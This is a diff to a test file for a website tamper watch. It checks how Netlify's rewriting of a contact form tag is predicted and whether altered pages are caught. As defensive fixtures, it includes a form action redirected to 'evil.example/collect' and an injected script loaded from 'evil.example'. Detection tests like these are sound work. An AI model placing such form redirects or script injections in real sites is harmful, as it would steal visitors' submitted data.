@@ -14,6 +14,16 @@
 //    passes;
 //  - DNS answers that differ from the baseline, or a weakened DMARC, are
 //    reported, and the real answers of October 2026 pass.
+//
+// The first version kept Netlify's rewritten form tag as fixed text. A week
+// later the two-step contact form changed the tag (an id and a class), and by
+// the time the watch was picked up again on November 10, 2026 it would have
+// reported the homepage as tampered with every night. The watch now works the
+// served tag out from the committed one, and this also checks that rule:
+//  - it gives exactly the tag the live site served for the October form and
+//    for the November form;
+//  - a form restyled in the repository passes with no baseline to update;
+//  - a tag the rule does not understand is not forgiven.
 const { ROOT, serveRepo } = require('./lib/env');
 const path = require('path');
 const fs = require('fs');
@@ -34,7 +44,36 @@ const titles = (r) => r.problems.map((p) => p.title);
   ok(!files.some((f) => /^(assets-src|tests|src|scripts|\.github)\//.test(f) || /^(package\.json|package-lock\.json|tailwind\.config\.js|README\.md|CLAUDE\.md|HANDOFF\.md|netlify\.toml|\.gitignore)$/.test(f)),
      'and nothing Netlify deletes or never serves');
   const index = fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8');
-  ok(index.includes(BASELINE.form.repo), 'the committed contact form tag is the one the baseline expects Netlify to rewrite');
+  const formTags = index.match(/<form\b[^>]*\bdata-netlify="true"[^>]*>/g) || [];
+  const formTag = formTags[0] || '';
+  const servedTag = watch.netlifyFormTag(formTag);
+  ok(formTags.length === 1 && !!servedTag, `the homepage has one form Netlify handles, and the watch knows how Netlify will rewrite its tag (${servedTag})`);
+
+  console.log('\n== how Netlify rewrites a form tag ==');
+  // Both pairs were read off buildleavitt.com: the form as it was in October
+  // 2026, and as the two-step form left it.
+  const SEEN = [
+    ['October 2026',
+      '<form class="space-y-8" name="contact" method="POST" action="/success.html" data-netlify="true" netlify-honeypot="bot-field">',
+      "<form action='/success' class='space-y-8' method='POST' name='contact'>"],
+    ['November 2026',
+      '<form id="contact-form" class="space-y-8 scroll-mt-28" name="contact" method="POST" action="/success.html" data-netlify="true" netlify-honeypot="bot-field">',
+      "<form action='/success' class='space-y-8 scroll-mt-28' id='contact-form' method='POST' name='contact'>"],
+  ];
+  for (const [when, committed, served] of SEEN) {
+    ok(watch.netlifyFormTag(committed) === served, `the rule gives the tag the live site served in ${when}`);
+  }
+  // A form restyled in the repository: served by the same rule, it passes, and
+  // there is no baseline to update. The fixed text of the first version failed here.
+  const restyled = '<form id="contact-form" class="grid gap-6" name="contact" method="POST" action="/success.html" data-netlify="true" netlify-honeypot="bot-field">';
+  const page = (tag) => Buffer.from(`<html><body>${tag}<input name="email"></form></body></html>`, 'utf8');
+  ok(watch.acceptNetlifyForm(page(watch.netlifyFormTag(restyled)), page(restyled)).equals(page(restyled)), 'a restyled form, rewritten by Netlify, compares equal to the committed page');
+  ok(!watch.acceptNetlifyForm(page("<form action='https://evil.example/collect' class='grid gap-6' id='contact-form' method='POST' name='contact'>"), page(restyled)).equals(page(restyled)),
+     'the same form with another action does not');
+  ok(!watch.acceptNetlifyForm(page(watch.netlifyFormTag(restyled) + '<script src="https://evil.example/x.js"></script>'), page(restyled)).equals(page(restyled)),
+     'nor does a page with anything else added beside the rewritten tag');
+  ok(watch.netlifyFormTag('<form novalidate name="contact" data-netlify="true">') === null && watch.netlifyFormTag("<form name=\"it's\" data-netlify=\"true\">") === null,
+     'a tag the rule does not understand gets no rewrite, so its page is compared exactly as served');
 
   console.log('\n== the live files against the repository ==');
   // Served as committed: nothing to report.
@@ -45,7 +84,7 @@ const titles = (r) => r.problems.map((p) => p.title);
 
   // Served as Netlify serves it (the form tag rewritten) with one character
   // changed on one other page: exactly that page is reported.
-  const asNetlify = (buf) => Buffer.from(buf.toString('utf8').replace(BASELINE.form.repo, BASELINE.form.live), 'utf8');
+  const asNetlify = (buf) => Buffer.from(buf.toString('utf8').replace(formTag, () => servedTag), 'utf8');
   site = await serveRepo((p, buf) => {
     if (p.endsWith(path.sep + 'index.html') && path.dirname(p) === ROOT) return asNetlify(buf);
     if (p.endsWith('terms.html')) return Buffer.from(buf.toString('utf8').replace('<title>', '<title>Hacked '), 'utf8');
@@ -60,7 +99,7 @@ const titles = (r) => r.problems.map((p) => p.title);
 
   // The form pointed somewhere else is a changed page, not Netlify's doing.
   site = await serveRepo((p, buf) => (p.endsWith('index.html') && path.dirname(p) === ROOT)
-    ? Buffer.from(buf.toString('utf8').replace(BASELINE.form.repo, "<form action='https://evil.example/collect' class='space-y-8' method='POST' name='contact'>"), 'utf8')
+    ? Buffer.from(buf.toString('utf8').replace(formTag, () => servedTag.replace("action='/success'", "action='https://evil.example/collect'")), 'utf8')
     : buf);
   r = await watch.checkSite({ site: site.base, root: ROOT, files: ['index.html'] });
   ok(r.problems.length === 1 && r.problems[0].detail.includes('evil.example'), 'a contact form sent to another address is reported');
